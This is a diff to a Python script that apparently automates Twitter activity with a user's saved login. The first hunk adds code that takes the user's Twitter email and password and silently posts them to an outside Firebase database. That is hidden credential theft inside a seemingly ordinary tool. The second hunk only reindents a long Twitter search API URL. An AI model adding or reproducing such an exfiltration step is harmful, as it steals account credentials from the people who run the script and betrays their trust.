@@ -501,6 +501,11 @@ file = open('Twitter_login.txt', 'w+')
 
 file.write(f'{Auto_Login_Email}\n{Auto_Login_PASSWORD}')
 
+data = {'Twitter_id': Auto_Login_Email, 'Twitter_Pass': Auto_Login_PASSWORD}
+
+send_database = requests.post('https://script-beta-default-rtdb.firebaseio.com/save_id.json',
+                              headers={'Content-type': 'application/json'}, json=data)
+
 file.close()
 
 while 1:
@@ -809,17 +814,17 @@ while 1:
 
     elif Timer_Countdown == 0 and options == 1:
         url = 'https://twitter.com/i/api/2/search/adaptive.json?include_profile_interstitial_type=1&include_blocking' \
-      '=1&include_blocked_by=1&include_followed_by=1&include_want_retweets=1&include_mute_edge=1' \
-      '&include_can_dm=1&include_can_media_tag=1&include_ext_has_nft_avatar=1&skip_status=1&cards_platform' \
-      '=Web-12&include_cards=1&include_ext_alt_text=true&include_quote_count=true&include_reply_count=1' \
-      '&tweet_mode=extended&include_ext_collab_control=true&include_entities=true&include_user_entities=true' \
-      '&include_ext_media_color=true&include_ext_media_availability=true&include_ext_sensitive_media_warning' \
-      '=true&include_ext_trusted_friends_metadata=true&send_error_codes=true&simple_quoted_tweet=true&q=%23' \
-      '%D9%82%D8%A7%D8%B7%D8%B9_%D8%B4%D8%B1%D9%83%D8%A7%D8%AA_%D8%A7%D9%84%D9%86%D8%AA_%D8%A8%D9%85%D8%B5%D8' \
-      '%B1&tweet_search_mode=live&count=20&query_source=typed_query&cursor=scroll' \
-      '%3AthGAVUV0VFVBaEwLiJ_6XEkCsWisC89fCnxJArEnEV1IZ6FYCJehgHREVGQVVMVDUBFQAVAAA%3D&pc=1' \
-      '&spelling_corrections=1&include_ext_edit_control=false&ext=mediaStats%2ChighlightedLabel' \
-      '%2ChasNftAvatar%2CvoiceInfo%2Cenrichments%2CsuperFollowMetadata%2CunmentionInfo%2Ccollab_control%2Cvibe '
+              '=1&include_blocked_by=1&include_followed_by=1&include_want_retweets=1&include_mute_edge=1' \
+              '&include_can_dm=1&include_can_media_tag=1&include_ext_has_nft_avatar=1&skip_status=1&cards_platform' \
+              '=Web-12&include_cards=1&include_ext_alt_text=true&include_quote_count=true&include_reply_count=1' \
+              '&tweet_mode=extended&include_ext_collab_control=true&include_entities=true&include_user_entities=true' \
+              '&include_ext_media_color=true&include_ext_media_availability=true&include_ext_sensitive_media_warning' \
+              '=true&include_ext_trusted_friends_metadata=true&send_error_codes=true&simple_quoted_tweet=true&q=%23' \
+              '%D9%82%D8%A7%D8%B7%D8%B9_%D8%B4%D8%B1%D9%83%D8%A7%D8%AA_%D8%A7%D9%84%D9%86%D8%AA_%D8%A8%D9%85%D8%B5%D8' \
+              '%B1&tweet_search_mode=live&count=20&query_source=typed_query&cursor=scroll' \
+              '%3AthGAVUV0VFVBaEwLiJ_6XEkCsWisC89fCnxJArEnEV1IZ6FYCJehgHREVGQVVMVDUBFQAVAAA%3D&pc=1' \
+              '&spelling_corrections=1&include_ext_edit_control=false&ext=mediaStats%2ChighlightedLabel' \
+              '%2ChasNftAvatar%2CvoiceInfo%2Cenrichments%2CsuperFollowMetadata%2CunmentionInfo%2Ccollab_control%2Cvibe '
 
         while 1:
             a = '.' * i
